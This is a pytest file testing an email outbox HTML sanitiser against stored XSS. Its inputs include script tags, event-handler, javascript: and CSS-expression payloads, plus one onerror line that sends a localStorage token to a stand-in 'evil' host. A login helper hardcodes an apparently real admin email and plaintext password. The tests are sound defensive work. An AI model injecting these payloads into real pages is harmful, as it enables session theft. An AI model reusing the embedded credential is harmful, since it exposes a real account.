"""v160.3.9.40 (SEC-002) — Email Outbox stored-XSS sanitiser.

Coverage:
  1. `<script>` tags are stripped.
  2. `onerror` / `onclick` handlers are stripped.
  3. `javascript:` and `data:text/html` URLs on `<a href>` are stripped.
  4. Hostile `style="expression(...)"` is stripped.
  5. `<iframe>` is stripped.
  6. `data:image/png;base64,...` on `<img src>` DOES survive.
  7. Safe tags (`<p>`, `<strong>`, plain `<a href="https://...">`,
     `<img src="https://...">`) DO survive.
  8. Sanitizer is idempotent (running twice = same output).
  9. `POST /api/email/send` end-to-end: hostile payload persists to
     `outbound_emails` in already-sanitised form. `body_html`
     retrieved via `GET /api/email/outbox/{id}` contains no
     `<script>`, no `onerror=`, no `javascript:` substring.

Ephemeral fixtures only. No prod user mutation.
"""
from __future__ import annotations

import uuid
import pytest
import requests

from .conftest import API

# Direct import of the sanitizer for the unit-level cases.
from email_outbox import sanitize_email_body_html


def _admin_token():
    r = requests.post(
        f"{API}/auth/login",
        json={"email": "stephen@paneltec.com.au",
              "password": "Mcgstephen50#"},
        timeout=10,
    )
    if r.status_code != 200:
        pytest.skip(f"admin login unavailable: HTTP {r.status_code}")
    return r.json().get("access_token") or r.json().get("token")


# ── Case 1 — <script> stripped
def test_case1_script_tag_stripped():
    out = sanitize_email_body_html(
        "<p>Hello</p><script>alert(1)</script><p>End</p>")
    assert "<script" not in out.lower()
    # The entire <script> block (including its inner text) must be
    # gone — otherwise `alert(1)` would appear as plaintext.
    assert "alert(1)" not in out
    assert "<p>Hello</p>" in out
    assert "<p>End</p>" in out


# ── Case 2 — on* handlers stripped
def test_case2_event_handlers_stripped():
    out = sanitize_email_body_html(
        '<img src="https://example.com/x.png" onerror="alert(1)">'
        '<a href="https://example.com" onclick="alert(2)">click</a>')
    assert "onerror" not in out.lower()
    assert "onclick" not in out.lower()
    assert "alert(" not in out
    # The tags themselves may survive with a scrubbed attribute set.
    assert "<img" in out
    assert "<a" in out


# ── Case 3 — javascript: and data:text/html URLs stripped
def test_case3_hostile_urls_stripped():
    out = sanitize_email_body_html(
        '<a href="javascript:alert(1)">click</a>'
        '<a href="data:text/html,<script>alert(2)</script>">click</a>')
    assert "javascript:" not in out.lower()
    # bleach may keep the anchor tag but drop the href entirely
    assert "alert(" not in out
    assert "text/html" not in out


# ── Case 4 — hostile inline style stripped
def test_case4_hostile_style_stripped():
    out = sanitize_email_body_html(
        '<span style="color:red;expression(alert(1));'
        'background-image:url(javascript:alert(2))">hi</span>')
    assert "expression(" not in out.lower()
    assert "javascript:" not in out.lower()
    # colour is allowed → should survive.
    assert "color" in out.lower() or "<span" in out.lower()


# ── Case 5 — <iframe> stripped
def test_case5_iframe_stripped():
    out = sanitize_email_body_html(
        '<p>ok</p><iframe src="https://evil"></iframe><p>after</p>')
    assert "<iframe" not in out.lower()
    assert "<p>ok</p>" in out
    assert "<p>after</p>" in out


# ── Case 6 — data:image/png;base64 SURVIVES
def test_case6_data_image_png_base64_survives():
    payload = ('<img src="data:image/png;base64,'
               'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=">')
    out = sanitize_email_body_html(payload)
    assert "data:image/png;base64," in out
    assert "<img" in out.lower()


# ── Case 7 — safe formatting survives
def test_case7_safe_formatting_survives():
    payload = (
        '<p><strong>Bold</strong> and <em>italic</em>.</p>'
        '<a href="https://example.com" title="link">click</a>'
        '<img src="https://example.com/pic.jpg" alt="pic">')
    out = sanitize_email_body_html(payload)
    assert "<p>" in out
    assert "<strong>Bold</strong>" in out
    assert "<em>italic</em>" in out
    assert '<a href="https://example.com"' in out
    assert '<img src="https://example.com/pic.jpg"' in out


# ── Case 8 — idempotent
def test_case8_idempotent():
    hostile = (
        '<script>alert(1)</script>'
        '<p>safe</p>'
        '<img src="x" onerror="alert(2)">'
    )
    once = sanitize_email_body_html(hostile)
    twice = sanitize_email_body_html(once)
    assert once == twice


# ── Case 9 — end-to-end: POST /email/send persists sanitised body_html
def test_case9_send_endpoint_persists_sanitized_body(_mongo):
    tok = _admin_token()
    tag = uuid.uuid4().hex[:10]
    hostile = (
        f'<p>Hello {tag} World</p>'
        '<script>window.___xss = 1;</script>'
        '<img src="x" onerror="fetch(\'//evil/?t=\'+localStorage.paneltec_token)">'
        '<a href="javascript:alert(1)">click</a>'
    )
    r = requests.post(
        f"{API}/email/send",
        json={
            "to": ["nobody-v40@example.com"],
            "cc": [],
            "subject": f"__v40_probe_{tag}",
            "body_html": hostile,
            "attachments": [],
            "resource_kind": "hazards",
        },
        headers={"Authorization": f"Bearer {tok}"},
        timeout=15,
    )
    assert r.status_code in (200, 201), f"send failed: HTTP={r.status_code} {r.text[:200]}"
    email_id = r.json().get("id") or r.json().get("email_id")
    assert email_id, f"send response missing id: {r.json()}"
    try:
        # Retrieve from outbox
        r2 = requests.get(
            f"{API}/email/outbox/{email_id}",
            headers={"Authorization": f"Bearer {tok}"},
            timeout=10,
        )
        assert r2.status_code == 200, f"outbox get failed: {r2.status_code}"
        stored = r2.json().get("body_html") or ""
        # Hostile fragments MUST all be gone
        assert "<script" not in stored.lower(), f"script survived: {stored!r}"
        assert "onerror" not in stored.lower(), f"onerror survived: {stored!r}"
        assert "javascript:" not in stored.lower(), f"javascript: survived: {stored!r}"
        # Safe marker MUST survive
        assert tag in stored, f"marker missing — sanitize too aggressive: {stored!r}"

        # Belt: also check Mongo directly
        doc = _mongo.outbound_emails.find_one({"id": email_id}, {"_id": 0, "body_html": 1})
        assert doc is not None
        raw = doc.get("body_html") or ""
        assert "<script" not in raw.lower()
        assert "onerror" not in raw.lower()
        assert "javascript:" not in raw.lower()
    finally:
        _mongo.outbound_emails.delete_one({"id": email_id})
